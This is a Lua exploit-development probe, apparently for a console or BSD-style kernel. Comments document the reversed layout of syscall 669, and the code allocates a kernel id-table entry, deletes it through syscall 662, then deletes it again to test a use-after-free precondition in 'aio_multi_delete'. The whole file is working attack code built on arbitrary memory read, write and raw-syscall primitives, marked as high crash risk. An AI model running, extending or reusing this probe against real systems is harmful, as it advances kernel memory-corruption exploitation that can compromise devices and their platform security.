-- CRASH_CLASS: HIGH
-- PROBE 488a: syscall 669 allocates an id-table entry, 662 deletes it
--
-- 13.60 669 (file off 0x3b2060) reads uap fields:
--   +0x00 flags (low12 must be 1 or 2)
--   +0x08 user buffer pointer
--   +0x10 count (1..0x80)
--   +0x18 mode (1..3)
--   +0x20 extra pointer
-- then allocates an entry via 0x3998e0 (proc+0xc48 id table), allocates
-- count*0x28 bytes and copyins from the user pointer. It returns the id.
--
-- If 14.10 matches, the returned id is a live object and 662 can delete it.
-- That is the precondition the aio_multi_delete UAF needs.
print("=== PROBE 488a: 669 create -> 662 delete ===")
io.stdout:setvbuf("no")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(buf, n)
    local out = {}
    for i = 0, n - 1 do
        local ok, b = pcall(function() return to_num(memory.read_byte(buf + i)) end)
        if not ok then out[#out + 1] = "??"; break end
        out[#out + 1] = string.format("%02x", b)
    end
    return table.concat(out, " ")
end

local data = memory.alloc(0x4000)
local ids  = memory.alloc(0x100)
local res  = memory.alloc(0x400)
for off = 0, 0x4000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
for off = 0, 0x100 - 1, 4  do pcall(function() memory.write_dword(ids + off, 0) end) end
for off = 0, 0x400 - 1, 4  do pcall(function() memory.write_dword(res + off, 0x42424242) end) end

local sc669 = make_syscall(669)
local sc662 = make_syscall(662)

print(string.format("[0] data=%s ids=%s res=%s", tostring(data), tostring(ids), tostring(res)))
print("[0] calling 669(flags=1, buf=data, count=4, mode=1, extra=0)")
local ok, rv = pcall(function() return sc669(uint64(1), uint64(data), uint64(4), uint64(1), uint64(0)) end)
print(string.format("[1] 669 ok=%s rv=%s", tostring(ok), tostring(rv)))
if not ok then print("=== PROBE 488a ABORT ===") return end
local id = to_num(rv)
print(string.format("[1] id=%d (%#x)", id, id))
if id < 0 or id > 0x7fffffff then print("[1] no id, stopping"); print("=== PROBE 488a COMPLETE ===") return end

pcall(function() memory.write_dword(ids, id) end)
print("[2] calling 662(ids=[id], count=1, res)")
local ok2, rv2 = pcall(function() return sc662(uint64(ids), uint64(1), uint64(res)) end)
print(string.format("[2] 662 ok=%s rv=%s ret=%d", tostring(ok2), tostring(rv2), ok2 and to_num(rv2) or -999))
print("[2] res = " .. hex(res, 0x20))

print("[3] calling 662 again with the same id (double delete)")
local ok3, rv3 = pcall(function() return sc662(uint64(ids), uint64(1), uint64(res)) end)
print(string.format("[3] 662 ok=%s ret=%d", tostring(ok3), ok3 and to_num(rv3) or -999))
print("[3] res = " .. hex(res, 0x20))
print("=== PROBE 488a COMPLETE ===")
